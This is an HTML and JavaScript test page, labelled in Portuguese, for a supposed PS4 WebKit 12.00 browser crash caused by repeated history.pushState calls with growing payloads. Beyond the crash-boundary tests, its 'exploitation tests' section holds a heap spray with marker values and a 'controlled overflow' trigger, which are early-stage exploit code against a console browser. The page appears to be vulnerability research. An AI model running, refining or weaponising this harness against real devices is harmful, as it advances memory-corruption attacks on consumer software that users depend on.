<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 WebKit History Bug - Minimal Test</title>
</head>
<body>

<h2>PS4 WebKit v12.00 - History Stack Overflow</h2>

<p><strong>LIMITE CRITICO CONFIRMADO: 50 iteracoes</strong></p>
<p>49 iteracoes ou menos: SEGURO | 50 ou mais: CRASH</p>

<hr>

<h3>Testes Seguros (sem crash)</h3>
<button onclick="test45()">Teste: 45 iteracoes (SEGURO)</button><br>
<button onclick="test48()">Teste: 48 iteracoes (SEGURO)</button><br>
<button onclick="test49()">Teste: 49 iteracoes (LIMITE SEGURO)</button><br>

<h3>Testes de Crash</h3>
<button onclick="test50()">Teste: 50 iteracoes (CRASH ESPERADO)</button><br>
<button onclick="test52()">Teste: 52 iteracoes (CRASH ESPERADO)</button><br>
<button onclick="test55()">Teste: 55 iteracoes (CRASH ESPERADO)</button><br>

<h3>Testes Diagnosticos</h3>
<button onclick="testBoundary()">Busca Precisa: 48-52 iteracoes</button><br>
<button onclick="testNoReplace()">Sem replaceState (apenas pushState)</button><br>
<button onclick="testSmallPayload()">Payloads pequenos (10 bytes)</button><br>
<button onclick="testNoAsync()">Sem history.back assincrono</button><br>

<h3>Testes de Exploitacao</h3>
<button onclick="testHeapSpray()">Heap Spray + 49 iteracoes</button><br>
<button onclick="testControlledOverflow()">Overflow Controlado (49 safe + 1 trigger)</button><br>

<hr>
<button onclick="clearLog()">Limpar Log</button>

<pre id="log"></pre>

<script>
const logEl = document.getElementById("log");

function log(m){ 
    const ts = new Date().toLocaleTimeString();
    logEl.textContent += `[${ts}] ${m}\n`; 
}

function clearLog(){ logEl.textContent = ""; }
function sleep(ms){ return new Promise(r=>setTimeout(r,ms)); }

const BASE = 977;
const STEP = 14461;
const SAFE_LIMIT = 49;
const CRASH_LIMIT = 50;

// ============================================
// CORE: Sequencia de History
// ============================================
async function historyLoop(iterations, options = {}){
    const {
        useReplace = true,
        useAsync = false,
        payloadSize = null,
        logDetail = true
    } = options;
    
    let size = payloadSize || BASE;
    
    for(let i = 0; i < iterations; i++){
        const payload = "H".repeat(size);
        
        if(logDetail){
            log(`[ITER ${i}] size=${size.toLocaleString()}`);
        }
        
        try {
            history.pushState({}, "", "#" + payload);
            
            if(useReplace){
                history.replaceState({}, "", "#" + payload.slice(0, payload.length >> 1));
            }
            
            if(useAsync && i % 6 === 0){
                setTimeout(() => history.back(), 0);
                if(logDetail) log("  -> history.back() async");
            }
            
            if(!payloadSize) size += STEP;
            await sleep(5);
            
        } catch(e){
            log(`[CRASH] ITER ${i}: ${e}`);
            throw e;
        }
    }
    
    return true;
}

// ============================================
// TESTES SEGUROS
// ============================================
async function test45(){
    clearLog();
    log("=== TESTE: 45 iteracoes ===");
    try {
        await historyLoop(45);
        log("[OK] 45 iteracoes completadas SEM CRASH");
    } catch(e){
        log("[ERRO] Crash inesperado: " + e);
    }
}

async function test48(){
    clearLog();
    log("=== TESTE: 48 iteracoes ===");
    try {
        await historyLoop(48);
        log("[OK] 48 iteracoes completadas SEM CRASH");
    } catch(e){
        log("[ERRO] Crash inesperado: " + e);
    }
}

async function test49(){
    clearLog();
    log("=== TESTE: 49 iteracoes (LIMITE SEGURO) ===");
    try {
        await historyLoop(49);
        log("[OK] 49 iteracoes completadas SEM CRASH");
        log(">>> Este e o LIMITE MAXIMO SEGURO <<<");
    } catch(e){
        log("[ERRO] Crash inesperado: " + e);
    }
}

// ============================================
// TESTES DE CRASH
// ============================================
async function test50(){
    clearLog();
    log("=== TESTE: 50 iteracoes (CRASH ESPERADO) ===");
    log("AVISO: Este teste deve causar crash!");
    await sleep(1000);
    
    try {
        await historyLoop(50);
        log("[INESPERADO] 50 iteracoes SEM CRASH!");
    } catch(e){
        log("[CRASH CONFIRMADO] " + e);
    }
}

async function test52(){
    clearLog();
    log("=== TESTE: 52 iteracoes (CRASH ESPERADO) ===");
    log("AVISO: Este teste deve causar crash!");
    await sleep(1000);
    
    try {
        await historyLoop(52);
        log("[INESPERADO] 52 iteracoes SEM CRASH!");
    } catch(e){
        log("[CRASH CONFIRMADO] " + e);
    }
}

async function test55(){
    clearLog();
    log("=== TESTE: 55 iteracoes (CRASH ESPERADO) ===");
    log("AVISO: Este teste deve causar crash!");
    await sleep(1000);
    
    try {
        await historyLoop(55);
        log("[INESPERADO] 55 iteracoes SEM CRASH!");
    } catch(e){
        log("[CRASH CONFIRMADO] " + e);
    }
}

// ============================================
// TESTES DIAGNOSTICOS
// ============================================
async function testBoundary(){
    clearLog();
    log("=== BUSCA PRECISA DO LIMITE ===");
    log("Testando de 48 a 52 iteracoes...\n");
    
    for(let i = 48; i <= 52; i++){
        log(`[TESTE ${i}] Executando ${i} iteracoes...`);
        
        try {
            await historyLoop(i, { logDetail: false });
            log(`[OK] ${i} iteracoes: SEM CRASH`);
            await sleep(200);
        } catch(e){
            log(`[CRASH] ${i} iteracoes: CRASH DETECTADO!`);
            log(`>>> LIMITE EXATO: ${i} iteracoes <<<`);
            return;
        }
    }
}

async function testNoReplace(){
    clearLog();
    log("=== TESTE: Sem replaceState ===");
    log("Apenas pushState, sem replaceState\n");
    
    try {
        await historyLoop(52, { useReplace: false });
        log("[OK] 52 iteracoes sem replaceState: SEM CRASH");
        log(">>> replaceState NAO e necessario para crash <<<");
    } catch(e){
        log("[CRASH] Mesmo sem replaceState: " + e);
        log(">>> Confirma: problema e a CONTAGEM de pushState <<<");
    }
}

async function testSmallPayload(){
    clearLog();
    log("=== TESTE: Payloads pequenos ===");
    log("Usando apenas 10 bytes por payload\n");
    
    try {
        await historyLoop(52, { payloadSize: 10 });
        log("[OK] 52 iteracoes com 10 bytes: SEM CRASH");
        log(">>> Tamanho do payload e irrelevante <<<");
    } catch(e){
        log("[CRASH] Com payloads pequenos: " + e);
        log(">>> Confirma: problema e CONTAGEM, nao tamanho <<<");
    }
}

async function testNoAsync(){
    clearLog();
    log("=== TESTE: Sem history.back assincrono ===");
    log("Sem chamadas async, apenas pushState/replaceState\n");
    
    try {
        await historyLoop(52, { useAsync: false });
        log("[OK] 52 iteracoes sem async: SEM CRASH");
        log(">>> history.back async NAO e necessario <<<");
    } catch(e){
        log("[CRASH] Mesmo sem async: " + e);
        log(">>> Confirma: NAO e race condition <<<");
    }
}

// ============================================
// TESTES DE EXPLOITACAO
// ============================================
async function testHeapSpray(){
    clearLog();
    log("=== HEAP SPRAY + 49 ITERACOES ===");
    log("Estrategia: Preencher heap antes do limite\n");
    
    try {
        log("[1] Criando objetos spray...");
        let spray = [];
        for(let i = 0; i < 200; i++){
            spray.push({
                marker: 0x41424344,
                index: i,
                data: "SPRAY".repeat(200)
            });
        }
        log(`[OK] ${spray.length} objetos spray criados`);
        
        await sleep(100);
        
        log("\n[2] Executando 49 iteracoes de history...");
        await historyLoop(49, { logDetail: false });
        log("[OK] 49 iteracoes completadas");
        
        log("\n[3] ESTADO PREPARADO");
        log("Heap contem: 200 objetos spray + 49 history entries");
        log("Proximo pushState (#50) vai corromper memoria adjacente!");
        log("\n>>> NAO executar pushState adicional! <<<");
        
    } catch(e){
        log("[ERRO] " + e);
    }
}

async function testControlledOverflow(){
    clearLog();
    log("=== OVERFLOW CONTROLADO ===");
    log("49 iteracoes seguras + 1 pushState gatilho\n");
    
    try {
        log("[1] Fase segura: 49 iteracoes...");
        await historyLoop(49, { logDetail: false });
        log("[OK] 49 iteracoes completadas (SAFE)");
        
        await sleep(200);
        
        log("\n[2] GATILHO: pushState #50...");
        const payload = "TRIGGER_OVERFLOW_" + "X".repeat(10000);
        history.pushState({}, "", "#" + payload);
        log("[OK] pushState #50 executado");
        
        await sleep(200);
        
        log("\n[3] Tentando usar historico corrompido...");
        for(let i = 0; i < 5; i++){
            history.pushState({}, "", "#test" + i);
            log(`  [ITER ${i}] pushState adicional`);
        }
        
        log("\n[INESPERADO] Nenhum crash detectado!");
        
    } catch(e){
        log("\n[CRASH] Overflow detectado: " + e);
        log(">>> Crash ocorreu apos pushState #50 <<<");
    }
}

// ============================================
// INICIALIZACAO
// ============================================
log("=== PS4 WebKit History Overflow Test ===");
log("Limite critico confirmado: 50 iteracoes");
log("49 ou menos: SEGURO | 50 ou mais: CRASH\n");
log("BASE=" + BASE + " | STEP=" + STEP);
log("Tamanho no iter 49: " + (BASE + 49 * STEP).toLocaleString() + " bytes");
log("\nPronto. Escolha um teste.");
</script>

</body>
</html>
